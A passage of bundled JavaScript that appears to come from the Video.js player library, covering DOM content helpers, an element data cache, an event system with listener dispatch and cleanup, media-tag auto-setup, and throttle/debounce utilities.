 * Empties the contents of an element.
 *
 * @param {Element} el
 *        The element to empty children from
 *
 * @return {Element}
 *         The element with no children
 */
function emptyEl(el) {
  while (el.firstChild) {
    el.removeChild(el.firstChild);
  }
  return el;
}

/**
 * Normalizes content for eventual insertion into the DOM.
 *
 * This allows a wide range of content definition methods, but protects
 * from falling into the trap of simply writing to `innerHTML`, which is
 * an XSS concern.
 *
 * The content for an element can be passed in multiple types and
 * combinations, whose behavior is as follows:
 *
 * @param {String|Element|TextNode|Array|Function} content
 *        - String: Normalized into a text node.
 *        - Element/TextNode: Passed through.
 *        - Array: A one-dimensional array of strings, elements, nodes, or functions
 *          (which return single strings, elements, or nodes).
 *        - Function: If the sole argument, is expected to produce a string, element,
 *          node, or array as defined above.
 *
 * @return {Array}
 *         All of the content that was passed in normalized.
 */
function normalizeContent(content) {

  // First, invoke content if it is a function. If it produces an array,
  // that needs to happen before normalization.
  if (typeof content === 'function') {
    content = content();
  }

  // Next up, normalize to an array, so one or many items can be normalized,
  // filtered, and returned.
  return (Array.isArray(content) ? content : [content]).map(function (value) {

    // First, invoke value if it is a function to produce a new value,
    // which will be subsequently normalized to a Node of some kind.
    if (typeof value === 'function') {
      value = value();
    }

    if (isEl(value) || isTextNode(value)) {
      return value;
    }

    if (typeof value === 'string' && /\S/.test(value)) {
      return document_1.createTextNode(value);
    }
  }).filter(function (value) {
    return value;
  });
}

/**
 * Normalizes and appends content to an element.
 *
 * @param {Element} el
 *        Element to append normalized content to.
 *
 *
 * @param {String|Element|TextNode|Array|Function} content
 *        See the `content` argument of {@link dom:normalizeContent}
 *
 * @return {Element}
 *         The element with appended normalized content.
 */
function appendContent(el, content) {
  normalizeContent(content).forEach(function (node) {
    return el.appendChild(node);
  });
  return el;
}

/**
 * Normalizes and inserts content into an element; this is identical to
 * `appendContent()`, except it empties the element first.
 *
 * @param {Element} el
 *        Element to insert normalized content into.
 *
 * @param {String|Element|TextNode|Array|Function} content
 *        See the `content` argument of {@link dom:normalizeContent}
 *
 * @return {Element}
 *         The element with inserted normalized content.
 *
 */
function insertContent(el, content) {
  return appendContent(emptyEl(el), content);
}

/**
 * Check if event was a single left click
 *
 * @param {EventTarget~Event} event
 *        Event object
 *
 * @return {boolean}
 *         - True if a left click
 *         - False if not a left click
 */
function isSingleLeftClick(event) {
  // Note: if you create something draggable, be sure to
  // call it on both `mousedown` and `mousemove` event,
  // otherwise `mousedown` should be enough for a button

  if (event.button === undefined && event.buttons === undefined) {
    // Why do we need `buttons` ?
    // Because, middle mouse sometimes have this:
    // e.button === 0 and e.buttons === 4
    // Furthermore, we want to prevent combination click, something like
    // HOLD middlemouse then left click, that would be
    // e.button === 0, e.buttons === 5
    // just `button` is not gonna work

    // Alright, then what this block does ?
    // this is for chrome `simulate mobile devices`
    // I want to support this as well

    return true;
  }

  if (event.button === 0 && event.buttons === undefined) {
    // Touch screen, sometimes on some specific device, `buttons`
    // doesn't have anything (safari on ios, blackberry...)

    return true;
  }

  if (IE_VERSION === 9) {
    // Ignore IE9

    return true;
  }

  if (event.button !== 0 || event.buttons !== 1) {
    // This is the reason we have those if else block above
    // if any special case we can catch and let it slide
    // we do it above, when get to here, this definitely
    // is-not-left-click

    return false;
  }

  return true;
}

/**
 * Finds a single DOM element matching `selector` within the optional
 * `context` of another DOM element (defaulting to `document`).
 *
 * @param {string} selector
 *        A valid CSS selector, which will be passed to `querySelector`.
 *
 * @param {Element|String} [context=document]
 *        A DOM element within which to query. Can also be a selector
 *        string in which case the first matching element will be used
 *        as context. If missing (or no element matches selector), falls
 *        back to `document`.
 *
 * @return {Element|null}
 *         The element that was found or null.
 */
var $ = createQuerier('querySelector');

/**
 * Finds a all DOM elements matching `selector` within the optional
 * `context` of another DOM element (defaulting to `document`).
 *
 * @param {string} selector
 *           A valid CSS selector, which will be passed to `querySelectorAll`.
 *
 * @param {Element|String} [context=document]
 *           A DOM element within which to query. Can also be a selector
 *           string in which case the first matching element will be used
 *           as context. If missing (or no element matches selector), falls
 *           back to `document`.
 *
 * @return {NodeList}
 *         A element list of elements that were found. Will be empty if none were found.
 *
 */
var $$ = createQuerier('querySelectorAll');



var Dom = (Object.freeze || Object)({
	isReal: isReal,
	isEl: isEl,
	isInFrame: isInFrame,
	createEl: createEl,
	textContent: textContent,
	prependTo: prependTo,
	hasClass: hasClass,
	addClass: addClass,
	removeClass: removeClass,
	toggleClass: toggleClass,
	setAttributes: setAttributes,
	getAttributes: getAttributes,
	getAttribute: getAttribute,
	setAttribute: setAttribute,
	removeAttribute: removeAttribute,
	blockTextSelection: blockTextSelection,
	unblockTextSelection: unblockTextSelection,
	getBoundingClientRect: getBoundingClientRect,
	findPosition: findPosition,
	getPointerPosition: getPointerPosition,
	isTextNode: isTextNode,
	emptyEl: emptyEl,
	normalizeContent: normalizeContent,
	appendContent: appendContent,
	insertContent: insertContent,
	isSingleLeftClick: isSingleLeftClick,
	$: $,
	$$: $$
});

/**
 * @file guid.js
 * @module guid
 */

/**
 * Unique ID for an element or function
 * @type {Number}
 */
var _guid = 1;

/**
 * Get a unique auto-incrementing ID by number that has not been returned before.
 *
 * @return {number}
 *         A new unique ID.
 */
function newGUID() {
  return _guid++;
}

/**
 * @file dom-data.js
 * @module dom-data
 */
/**
 * Element Data Store.
 *
 * Allows for binding data to an element without putting it directly on the
 * element. Ex. Event listeners are stored here.
 * (also from jsninja.com, slightly modified and updated for closure compiler)
 *
 * @type {Object}
 * @private
 */
var elData = {};

/*
 * Unique attribute name to store an element's guid in
 *
 * @type {String}
 * @constant
 * @private
 */
var elIdAttr = 'vdata' + new Date().getTime();

/**
 * Returns the cache object where data for an element is stored
 *
 * @param {Element} el
 *        Element to store data for.
 *
 * @return {Object}
 *         The cache object for that el that was passed in.
 */
function getData(el) {
  var id = el[elIdAttr];

  if (!id) {
    id = el[elIdAttr] = newGUID();
  }

  if (!elData[id]) {
    elData[id] = {};
  }

  return elData[id];
}

/**
 * Returns whether or not an element has cached data
 *
 * @param {Element} el
 *        Check if this element has cached data.
 *
 * @return {boolean}
 *         - True if the DOM element has cached data.
 *         - False otherwise.
 */
function hasData(el) {
  var id = el[elIdAttr];

  if (!id) {
    return false;
  }

  return !!Object.getOwnPropertyNames(elData[id]).length;
}

/**
 * Delete data for the element from the cache and the guid attr from getElementById
 *
 * @param {Element} el
 *        Remove cached data for this element.
 */
function removeData(el) {
  var id = el[elIdAttr];

  if (!id) {
    return;
  }

  // Remove all stored data
  delete elData[id];

  // Remove the elIdAttr property from the DOM node
  try {
    delete el[elIdAttr];
  } catch (e) {
    if (el.removeAttribute) {
      el.removeAttribute(elIdAttr);
    } else {
      // IE doesn't appear to support removeAttribute on the document element
      el[elIdAttr] = null;
    }
  }
}

/**
 * @file events.js. An Event System (John Resig - Secrets of a JS Ninja http://jsninja.com/)
 * (Original book version wasn't completely usable, so fixed some things and made Closure Compiler compatible)
 * This should work very similarly to jQuery's events, however it's based off the book version which isn't as
 * robust as jquery's, so there's probably some differences.
 *
 * @module events
 */

/**
 * Clean up the listener cache and dispatchers
 *
 * @param {Element|Object} elem
 *        Element to clean up
 *
 * @param {string} type
 *        Type of event to clean up
 */
function _cleanUpEvents(elem, type) {
  var data = getData(elem);

  // Remove the events of a particular type if there are none left
  if (data.handlers[type].length === 0) {
    delete data.handlers[type];
    // data.handlers[type] = null;
    // Setting to null was causing an error with data.handlers

    // Remove the meta-handler from the element
    if (elem.removeEventListener) {
      elem.removeEventListener(type, data.dispatcher, false);
    } else if (elem.detachEvent) {
      elem.detachEvent('on' + type, data.dispatcher);
    }
  }

  // Remove the events object if there are no types left
  if (Object.getOwnPropertyNames(data.handlers).length <= 0) {
    delete data.handlers;
    delete data.dispatcher;
    delete data.disabled;
  }

  // Finally remove the element data if there is no data left
  if (Object.getOwnPropertyNames(data).length === 0) {
    removeData(elem);
  }
}

/**
 * Loops through an array of event types and calls the requested method for each type.
 *
 * @param {Function} fn
 *        The event method we want to use.
 *
 * @param {Element|Object} elem
 *        Element or object to bind listeners to
 *
 * @param {string} type
 *        Type of event to bind to.
 *
 * @param {EventTarget~EventListener} callback
 *        Event listener.
 */
function _handleMultipleEvents(fn, elem, types, callback) {
  types.forEach(function (type) {
    // Call the event method for each one of the types
    fn(elem, type, callback);
  });
}

/**
 * Fix a native event to have standard property values
 *
 * @param {Object} event
 *        Event object to fix.
 *
 * @return {Object}
 *         Fixed event object.
 */
function fixEvent(event) {

  function returnTrue() {
    return true;
  }

  function returnFalse() {
    return false;
  }

  // Test if fixing up is needed
  // Used to check if !event.stopPropagation instead of isPropagationStopped
  // But native events return true for stopPropagation, but don't have
  // other expected methods like isPropagationStopped. Seems to be a problem
  // with the Javascript Ninja code. So we're just overriding all events now.
  if (!event || !event.isPropagationStopped) {
    var old = event || window_1.event;

    event = {};
    // Clone the old object so that we can modify the values event = {};
    // IE8 Doesn't like when you mess with native event properties
    // Firefox returns false for event.hasOwnProperty('type') and other props
    //  which makes copying more difficult.
    // TODO: Probably best to create a whitelist of event props
    for (var key in old) {
      // Safari 6.0.3 warns you if you try to copy deprecated layerX/Y
      // Chrome warns you if you try to copy deprecated keyboardEvent.keyLocation
      // and webkitMovementX/Y
      if (key !== 'layerX' && key !== 'layerY' && key !== 'keyLocation' && key !== 'webkitMovementX' && key !== 'webkitMovementY') {
        // Chrome 32+ warns if you try to copy deprecated returnValue, but
        // we still want to if preventDefault isn't supported (IE8).
        if (!(key === 'returnValue' && old.preventDefault)) {
          event[key] = old[key];
        }
      }
    }

    // The event occurred on this element
    if (!event.target) {
      event.target = event.srcElement || document_1;
    }

    // Handle which other element the event is related to
    if (!event.relatedTarget) {
      event.relatedTarget = event.fromElement === event.target ? event.toElement : event.fromElement;
    }

    // Stop the default browser action
    event.preventDefault = function () {
      if (old.preventDefault) {
        old.preventDefault();
      }
      event.returnValue = false;
      old.returnValue = false;
      event.defaultPrevented = true;
    };

    event.defaultPrevented = false;

    // Stop the event from bubbling
    event.stopPropagation = function () {
      if (old.stopPropagation) {
        old.stopPropagation();
      }
      event.cancelBubble = true;
      old.cancelBubble = true;
      event.isPropagationStopped = returnTrue;
    };

    event.isPropagationStopped = returnFalse;

    // Stop the event from bubbling and executing other handlers
    event.stopImmediatePropagation = function () {
      if (old.stopImmediatePropagation) {
        old.stopImmediatePropagation();
      }
      event.isImmediatePropagationStopped = returnTrue;
      event.stopPropagation();
    };

    event.isImmediatePropagationStopped = returnFalse;

    // Handle mouse position
    if (event.clientX !== null && event.clientX !== undefined) {
      var doc = document_1.documentElement;
      var body = document_1.body;

      event.pageX = event.clientX + (doc && doc.scrollLeft || body && body.scrollLeft || 0) - (doc && doc.clientLeft || body && body.clientLeft || 0);
      event.pageY = event.clientY + (doc && doc.scrollTop || body && body.scrollTop || 0) - (doc && doc.clientTop || body && body.clientTop || 0);
    }

    // Handle key presses
    event.which = event.charCode || event.keyCode;

    // Fix button for mouse clicks:
    // 0 == left; 1 == middle; 2 == right
    if (event.button !== null && event.button !== undefined) {

      // The following is disabled because it does not pass videojs-standard
      // and... yikes.
      /* eslint-disable */
      event.button = event.button & 1 ? 0 : event.button & 4 ? 1 : event.button & 2 ? 2 : 0;
      /* eslint-enable */
    }
  }

  // Returns fixed-up instance
  return event;
}

/**
 * Whether passive event listeners are supported
 */
var _supportsPassive = false;

(function () {
  try {
    var opts = Object.defineProperty({}, 'passive', {
      get: function get() {
        _supportsPassive = true;
      }
    });

    window_1.addEventListener('test', null, opts);
    window_1.removeEventListener('test', null, opts);
  } catch (e) {
    // disregard
  }
})();

/**
 * Touch events Chrome expects to be passive
 */
var passiveEvents = ['touchstart', 'touchmove'];

/**
 * Add an event listener to element
 * It stores the handler function in a separate cache object
 * and adds a generic handler to the element's event,
 * along with a unique id (guid) to the element.
 *
 * @param {Element|Object} elem
 *        Element or object to bind listeners to
 *
 * @param {string|string[]} type
 *        Type of event to bind to.
 *
 * @param {EventTarget~EventListener} fn
 *        Event listener.
 */
function on(elem, type, fn) {
  if (Array.isArray(type)) {
    return _handleMultipleEvents(on, elem, type, fn);
  }

  var data = getData(elem);

  // We need a place to store all our handler data
  if (!data.handlers) {
    data.handlers = {};
  }

  if (!data.handlers[type]) {
    data.handlers[type] = [];
  }

  if (!fn.guid) {
    fn.guid = newGUID();
  }

  data.handlers[type].push(fn);

  if (!data.dispatcher) {
    data.disabled = false;

    data.dispatcher = function (event, hash) {

      if (data.disabled) {
        return;
      }

      event = fixEvent(event);

      var handlers = data.handlers[event.type];

      if (handlers) {
        // Copy handlers so if handlers are added/removed during the process it doesn't throw everything off.
        var handlersCopy = handlers.slice(0);

        for (var m = 0, n = handlersCopy.length; m < n; m++) {
          if (event.isImmediatePropagationStopped()) {
            break;
          } else {
            try {
              handlersCopy[m].call(elem, event, hash);
            } catch (e) {
              log$1.error(e);
            }
          }
        }
      }
    };
  }

  if (data.handlers[type].length === 1) {
    if (elem.addEventListener) {
      var options = false;

      if (_supportsPassive && passiveEvents.indexOf(type) > -1) {
        options = { passive: true };
      }
      elem.addEventListener(type, data.dispatcher, options);
    } else if (elem.attachEvent) {
      elem.attachEvent('on' + type, data.dispatcher);
    }
  }
}

/**
 * Removes event listeners from an element
 *
 * @param {Element|Object} elem
 *        Object to remove listeners from.
 *
 * @param {string|string[]} [type]
 *        Type of listener to remove. Don't include to remove all events from element.
 *
 * @param {EventTarget~EventListener} [fn]
 *        Specific listener to remove. Don't include to remove listeners for an event
 *        type.
 */
function off(elem, type, fn) {
  // Don't want to add a cache object through getElData if not needed
  if (!hasData(elem)) {
    return;
  }

  var data = getData(elem);

  // If no events exist, nothing to unbind
  if (!data.handlers) {
    return;
  }

  if (Array.isArray(type)) {
    return _handleMultipleEvents(off, elem, type, fn);
  }

  // Utility function
  var removeType = function removeType(el, t) {
    data.handlers[t] = [];
    _cleanUpEvents(el, t);
  };

  // Are we removing all bound events?
  if (type === undefined) {
    for (var t in data.handlers) {
      if (Object.prototype.hasOwnProperty.call(data.handlers || {}, t)) {
        removeType(elem, t);
      }
    }
    return;
  }

  var handlers = data.handlers[type];

  // If no handlers exist, nothing to unbind
  if (!handlers) {
    return;
  }

  // If no listener was provided, remove all listeners for type
  if (!fn) {
    removeType(elem, type);
    return;
  }

  // We're only removing a single handler
  if (fn.guid) {
    for (var n = 0; n < handlers.length; n++) {
      if (handlers[n].guid === fn.guid) {
        handlers.splice(n--, 1);
      }
    }
  }

  _cleanUpEvents(elem, type);
}

/**
 * Trigger an event for an element
 *
 * @param {Element|Object} elem
 *        Element to trigger an event on
 *
 * @param {EventTarget~Event|string} event
 *        A string (the type) or an event object with a type attribute
 *
 * @param {Object} [hash]
 *        data hash to pass along with the event
 *
 * @return {boolean|undefined}
 *         - Returns the opposite of `defaultPrevented` if default was prevented
 *         - Otherwise returns undefined
 */
function trigger(elem, event, hash) {
  // Fetches element data and a reference to the parent (for bubbling).
  // Don't want to add a data object to cache for every parent,
  // so checking hasElData first.
  var elemData = hasData(elem) ? getData(elem) : {};
  var parent = elem.parentNode || elem.ownerDocument;
  // type = event.type || event,
  // handler;

  // If an event name was passed as a string, creates an event out of it
  if (typeof event === 'string') {
    event = { type: event, target: elem };
  } else if (!event.target) {
    event.target = elem;
  }

  // Normalizes the event properties.
  event = fixEvent(event);

  // If the passed element has a dispatcher, executes the established handlers.
  if (elemData.dispatcher) {
    elemData.dispatcher.call(elem, event, hash);
  }

  // Unless explicitly stopped or the event does not bubble (e.g. media events)
  // recursively calls this function to bubble the event up the DOM.
  if (parent && !event.isPropagationStopped() && event.bubbles === true) {
    trigger.call(null, parent, event, hash);

    // If at the top of the DOM, triggers the default action unless disabled.
  } else if (!parent && !event.defaultPrevented) {
    var targetData = getData(event.target);

    // Checks if the target has a default action for this event.
    if (event.target[event.type]) {
      // Temporarily disables event dispatching on the target as we have already executed the handler.
      targetData.disabled = true;
      // Executes the default action.
      if (typeof event.target[event.type] === 'function') {
        event.target[event.type]();
      }
      // Re-enables event dispatching.
      targetData.disabled = false;
    }
  }

  // Inform the triggerer if the default was prevented by returning false
  return !event.defaultPrevented;
}

/**
 * Trigger a listener only once for an event
 *
 * @param {Element|Object} elem
 *        Element or object to bind to.
 *
 * @param {string|string[]} type
 *        Name/type of event
 *
 * @param {Event~EventListener} fn
 *        Event Listener function
 */
function one(elem, type, fn) {
  if (Array.isArray(type)) {
    return _handleMultipleEvents(one, elem, type, fn);
  }
  var func = function func() {
    off(elem, type, func);
    fn.apply(this, arguments);
  };

  // copy the guid to the new function so it can removed using the original function's ID
  func.guid = fn.guid = fn.guid || newGUID();
  on(elem, type, func);
}

var Events = (Object.freeze || Object)({
	fixEvent: fixEvent,
	on: on,
	off: off,
	trigger: trigger,
	one: one
});

/**
 * @file setup.js - Functions for setting up a player without
 * user interaction based on the data-setup `attribute` of the video tag.
 *
 * @module setup
 */
var _windowLoaded = false;
var videojs$2 = void 0;

/**
 * Set up any tags that have a data-setup `attribute` when the player is started.
 */
var autoSetup = function autoSetup() {

  // Protect against breakage in non-browser environments and check global autoSetup option.
  if (!isReal() || videojs$2.options.autoSetup === false) {
    return;
  }

  // One day, when we stop supporting IE8, go back to this, but in the meantime...*hack hack hack*
  // var vids = Array.prototype.slice.call(document.getElementsByTagName('video'));
  // var audios = Array.prototype.slice.call(document.getElementsByTagName('audio'));
  // var mediaEls = vids.concat(audios);

  // Because IE8 doesn't support calling slice on a node list, we need to loop
  // through each list of elements to build up a new, combined list of elements.
  var vids = document_1.getElementsByTagName('video');
  var audios = document_1.getElementsByTagName('audio');
  var divs = document_1.getElementsByTagName('video-js');
  var mediaEls = [];

  if (vids && vids.length > 0) {
    for (var i = 0, e = vids.length; i < e; i++) {
      mediaEls.push(vids[i]);
    }
  }

  if (audios && audios.length > 0) {
    for (var _i = 0, _e = audios.length; _i < _e; _i++) {
      mediaEls.push(audios[_i]);
    }
  }

  if (divs && divs.length > 0) {
    for (var _i2 = 0, _e2 = divs.length; _i2 < _e2; _i2++) {
      mediaEls.push(divs[_i2]);
    }
  }

  // Check if any media elements exist
  if (mediaEls && mediaEls.length > 0) {

    for (var _i3 = 0, _e3 = mediaEls.length; _i3 < _e3; _i3++) {
      var mediaEl = mediaEls[_i3];

      // Check if element exists, has getAttribute func.
      // IE seems to consider typeof el.getAttribute == 'object' instead of
      // 'function' like expected, at least when loading the player immediately.
      if (mediaEl && mediaEl.getAttribute) {

        // Make sure this player hasn't already been set up.
        if (mediaEl.player === undefined) {
          var options = mediaEl.getAttribute('data-setup');

          // Check if data-setup attr exists.
          // We only auto-setup if they've added the data-setup attr.
          if (options !== null) {
            // Create new video.js instance.
            videojs$2(mediaEl);
          }
        }

        // If getAttribute isn't defined, we need to wait for the DOM.
      } else {
        autoSetupTimeout(1);
        break;
      }
    }

    // No videos were found, so keep looping unless page is finished loading.
  } else if (!_windowLoaded) {
    autoSetupTimeout(1);
  }
};

/**
 * Wait until the page is loaded before running autoSetup. This will be called in
 * autoSetup if `hasLoaded` returns false.
 *
 * @param {number} wait
 *        How long to wait in ms
 *
 * @param {module:videojs} [vjs]
 *        The videojs library function
 */
function autoSetupTimeout(wait, vjs) {
  // if (vjs) {
    // videojs$2 = vjs;
  // }

  // window_1.setTimeout(autoSetup, wait);
}

if (isReal() && document_1.readyState === 'complete') {
  _windowLoaded = true;
} else {
  /**
   * Listen for the load event on window, and set _windowLoaded to true.
   *
   * @listens load
   */
  one(window_1, 'load', function () {
    _windowLoaded = true;
  });
}

/**
 * @file stylesheet.js
 * @module stylesheet
 */
/**
 * Create a DOM syle element given a className for it.
 *
 * @param {string} className
 *        The className to add to the created style element.
 *
 * @return {Element}
 *         The element that was created.
 */
var createStyleElement = function createStyleElement(className) {
  var style = document_1.createElement('style');

  style.className = className;

  return style;
};

/**
 * Add text to a DOM element.
 *
 * @param {Element} el
 *        The Element to add text content to.
 *
 * @param {string} content
 *        The text to add to the element.
 */
var setTextContent = function setTextContent(el, content) {
  if (el.styleSheet) {
    el.styleSheet.cssText = content;
  } else {
    el.textContent = content;
  }
};

/**
 * @file fn.js
 * @module fn
 */
/**
 * Bind (a.k.a proxy or Context). A simple method for changing the context of a function
 * It also stores a unique id on the function so it can be easily removed from events.
 *
 * @param {Mixed} context
 *        The object to bind as scope.
 *
 * @param {Function} fn
 *        The function to be bound to a scope.
 *
 * @param {number} [uid]
 *        An optional unique ID for the function to be set
 *
 * @return {Function}
 *         The new function that will be bound into the context given
 */
var bind = function bind(context, fn, uid) {
  // Make sure the function has a unique ID
  if (!fn.guid) {
    fn.guid = newGUID();
  }

  // Create the new function that changes the context
  var bound = function bound() {
    return fn.apply(context, arguments);
  };

  // Allow for the ability to individualize this function
  // Needed in the case where multiple objects might share the same prototype
  // IF both items add an event listener with the same function, then you try to remove just one
  // it will remove both because they both have the same guid.
  // when using this, you need to use the bind method when you remove the listener as well.
  // currently used in text tracks
  bound.guid = uid ? uid + '_' + fn.guid : fn.guid;

  return bound;
};

/**
 * Wraps the given function, `fn`, with a new function that only invokes `fn`
 * at most once per every `wait` milliseconds.
 *
 * @param  {Function} fn
 *         The function to be throttled.
 *
 * @param  {Number}   wait
 *         The number of milliseconds by which to throttle.
 *
 * @return {Function}
 */
var throttle = function throttle(fn, wait) {
  var last = Date.now();

  var throttled = function throttled() {
    var now = Date.now();

    if (now - last >= wait) {
      fn.apply(undefined, arguments);
      last = now;
    }
  };

  return throttled;
};

/**
 * Creates a debounced function that delays invoking `func` until after `wait`
 * milliseconds have elapsed since the last time the debounced function was
 * invoked.
 *
 * Inspired by lodash and underscore implementations.
 *
 * @param  {Function} func
 *         The function to wrap with debounce behavior.
 *
 * @param  {number} wait
 *         The number of milliseconds to wait after the last invocation.
 *
 * @param  {boolean} [immediate]
 *         Whether or not to invoke the function immediately upon creation.
 *
 * @param  {Object} [context=window]
 *         The "context" in which the debounced function should debounce. For
 *         example, if this function should be tied to a Video.js player,
 *         the player can be passed here. Alternatively, defaults to the
 *         global `window` object.
 *
 * @return {Function}
 *         A debounced function.
 */
var debounce = function debounce(func, wait, immediate) {
  var context = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : window_1;

  var timeout = void 0;

  /* eslint-disable consistent-this */
  return function () {
    var self = this;
    var args = arguments;

    var _later = function later() {
      timeout = null;
      _later = null;
      if (!immediate) {
        func.apply(self, args);
      }
    };

    if (!timeout && immediate) {
      func.apply(self, args);
    }

    context.clearTimeout(timeout);
    timeout = context.setTimeout(_later, wait);
  };
  /* eslint-enable consistent-this */
};

/**
 * @file src/js/event-target.js
 */
/**
 * `EventTarget` is a class that can have the same API as the DOM `EventTarget`. It
 * adds shorthand functions that wrap around lengthy functions. For example:
 * the `on` function is a wrapper around `addEventListener`.
 *
 * @see [EventTarget Spec]{@link https://www.w3.org/TR/DOM-Level-2-Events/events.html#Events-EventTarget}
 * @class EventTarget
 */
var EventTarget = function EventTarget() {};

/**
 * A Custom DOM event.
 *
 * @typedef {Object} EventTarget~Event
 * @see [Properties]{@link https://developer.mozilla.org/en-US/docs/Web/API/CustomEvent}
 */

/**
 * All event listeners should follow the following format.
 *
 * @callback EventTarget~EventListener
 * @this {EventTarget}
 *
 * @param {EventTarget~Event} event
 *        the event that triggered this function
 *
 * @param {Object} [hash]
 *        hash of data sent during the event
 */

/**
 * An object containing event names as keys and booleans as values.
 *
 * > NOTE: If an event name is set to a true value here {@link EventTarget#trigger}
 *         will have extra functionality. See that function for more information.
 *
 * @property EventTarget.prototype.allowedEvents_
 * @private
 */
EventTarget.prototype.allowedEvents_ = {};

/**
 * Adds an `event listener` to an instance of an `EventTarget`. An `event listener` is a
 * function that will get called when an event with a certain name gets triggered.
 *
 * @param {string|string[]} type
 *        An event name or an array of event names.
 *
 * @param {EventTarget~EventListener} fn
 *        The function to call with `EventTarget`s
 */
EventTarget.prototype.on = function (type, fn) {
  // Remove the addEventListener alias before calling Events.on
  // so we don't get into an infinite type loop
  var ael = this.addEventListener;

  this.addEventListener = function () {};
  on(this, type, fn);
  this.addEventListener = ael;
};

/**
 * An alias of {@link EventTarget#on}. Allows `EventTarget` to mimic
 * the standard DOM API.
 *
 * @function
 * @see {@link EventTarget#on}
 */
EventTarget.prototype.addEventListener = EventTarget.prototype.on;

/**
 * Removes an `event listener` for a specific event from an instance of `EventTarget`.
 * This makes it so that the `event listener` will no longer get called when the
 * named event happens.
 *
 * @param {string|string[]} type
 *        An event name or an array of event names.
 *
 * @param {EventTarget~EventListener} fn
 *        The function to remove.
 */
EventTarget.prototype.off = function (type, fn) {
  off(this, type, fn);
};

/**
 * An alias of {@link EventTarget#off}. Allows `EventTarget` to mimic
 * the standard DOM API.
 *
 * @function
 * @see {@link EventTarget#off}
 */
EventTarget.prototype.removeEventListener = EventTarget.prototype.off;

/**
 * This function will add an `event listener` that gets triggered only once. After the
 * first trigger it will get removed. This is like adding an `event listener`
 * with {@link EventTarget#on} that calls {@link EventTarget#off} on itself.
 *
 * @param {string|string[]} type
 *        An event name or an array of event names.
 *
 * @param {EventTarget~EventListener} fn
 *        The function to be called once for each event name.
 */
EventTarget.prototype.one = function (type, fn) {
  // Remove the addEventListener alialing Events.on
  // so we don't get into an infinite type loop
  var ael = this.addEventListener;

  this.addEventListener = function () {};
  one(this, type, fn);
  this.addEventListener = ael;
};

/**
 * This function causes an event to happen. This will then cause any `event listeners`
 * that are waiting for that event, to get called. If there are no `event listeners`
 * for an event then nothing will happen.
 *
 * If the name of the `Event` that is being triggered is in `EventTarget.allowedEvents_`.
 * Trigger will also call the `on` + `uppercaseEventName` function.
 *
 * Example:
 * 'click' is in `EventTarget.allowedEvents_`, so, trigger will attempt to call
 * `onClick` if it exists.
 *
 * @param {string|EventTarget~Event|Object} event
 *        The name of the event, an `Event`, or an object with a key of type set to
 *        an event name.
 */
EventTarget.prototype.trigger = function (event) {
  var type = event.type || event;

  if (typeof event === 'string') {
    event = { type: type };
  }
  event = fixEvent(event);

  if (this.allowedEvents_[type] && this['on' + type]) {
    this['on' + type](event);
  }

  trigger(this, event);
};

/**
 * An alias of {@link EventTarget#trigger}. Allows `EventTarget` to mimic
 * the standard DOM API.
 *
 * @function
 * @see {@link EventTarget#trigger}
 */
EventTarget.prototype.dispatchEvent = EventTarget.prototype.trigger;

/**
 * @file mixins/evented.js
 * @module evented
 */
/**
 * Returns whether or not an object has had the evented mixin applied.
 *
 * @param  {Object} object
 *         An object to test.
 *
 * @return {boolean}
 *         Whether or not the object appears to be evented.
 */
var isEvented = function isEvented(object) {
  return object instanceof EventTarget || !!object.eventBusEl_ && ['on', 'one', 'off', 'trigger'].every(function (k) {
    return typeof object[k] === 'function';
  });
};

/**
 * Whether a value is a valid event type - non-empty string or array.
 *
 * @private
 * @param  {string|Array} type
 *         The type value to test.
 *
 * @return {boolean}
 *         Whether or not the type is a valid event type.
 */
var isValidEventType = function isValidEventType(type) {
  return (
    // The regex here verifies that the `type` contains at least one non-
    // whitespace character.
    typeof type === 'string' && /\S/.test(type) || Array.isArray(type) && !!type.length
  );
};

/**
 * Validates a value to determine if it is a valid event target. Throws if not.
 *
 * @private
 * @throws {Error}
 *         If the target does not appear to be a valid event target.
 *
 * @param  {Object} target
 *         The object to test.
 */
var validateTarget = function validateTarget(target) {
  if (!target.nodeName && !isEvented(target)) {
    throw new Error('Invalid target; must be a DOM node or evented object.');
  }
};

/**
 * Validates a value to determine if it is a valid event target. Throws if not.
 *
 * @private
 * @throws {Error}
 *         If the type does not appear to be a valid event type.
 *
 * @param  {string|Array} type
 *         The type to test.
 */
var validateEventType = function validateEventType(type) {
  if (!isValidEventType(type)) {
    throw new Error('Invalid event type; must be a non-empty string or array.');
  }
};

/**
 * Validates a value to determine if it is a valid listener. Throws if not.
 *
 * @private
 * @throws {Error}
 *         If the listener is not a function.
 *
 * @param  {Function} listener
 *         The listener to test.
 */
var validateListener = function validateListener(listener) {
  if (typeof listener !== 'function') {
    throw new Error('Invalid listener; must be a function.');
  }
};

/**
 * Takes an array of arguments given to `on()` or `one()`, validates them, and
 * normalizes them into an object.
 *
 * @private
 * @param  {Object} self
 *         The evented object on which `on()` or `one()` was called. This
 *         object will be bound as the `this` value for the listener.
 *
 * @param  {Array} args
 *         An array of arguments passed to `on()` or `one()`.
 *
 * @return {Object}
 *         An object containing useful values for `on()` or `one()` calls.
 */
var normalizeListenArgs = function normalizeListenArgs(self, args) {

  // If the number of arguments is less than 3, the target is always the
  // evented object itself.
  var isTargetingSelf = args.length < 3 || args[0] === self || args[0] === self.eventBusEl_;
  var target = void 0;
  var type = void 0;
  var listener = void 0;

  if (isTargetingSelf) {
    target = self.eventBusEl_;

    // Deal with cases where we got 3 arguments, but we are still listening to
    // the evented object itself.
    if (args.length >= 3) {
      args.shift();
    }

    type = args[0];
    listener = args[1];
  } else {
    target = args[0];
    type = args[1];
    listener = args[2];
  }

  validateTarget(target);
  validateEventType(type);
  validateListener(listener);

  listener = bind(self, listener);

  return { isTargetingSelf: isTargetingSelf, target: target, type: type, listener: listener };
};

/**
 * Adds the listener to the event type(s) on the target, normalizing for
 * the type of target.
 *
 * @private
 * @param  {Element|Object} target
 *         A DOM node or evented object.
 *
 * @param  {string} method
 *         The event binding method to use ("on" or "one").
 *
 * @param  {string|Array} type
 *         One or more event type(s).
 *
 * @param  {Function} listener
 *         A listener function.
 */
var listen = function listen(target, method, type, listener) {
  validateTarget(target);

  if (target.nodeName) {
    Events[method](target, type, listener);
  } else {
    target[method](type, listener);
  }
};

/**
 * Contains methods that provide event capabilites to an object which is passed
 * to {@link module:evented|evented}.
 *
 * @mixin EventedMixin
 */
var EventedMixin = {

  /**
   * Add a listener to an event (or events) on this object or another evented
   * object.
   *
   * @param  {string|Array|Element|Object} targetOrType
   *         If this is a string or array, it represents the event type(s)
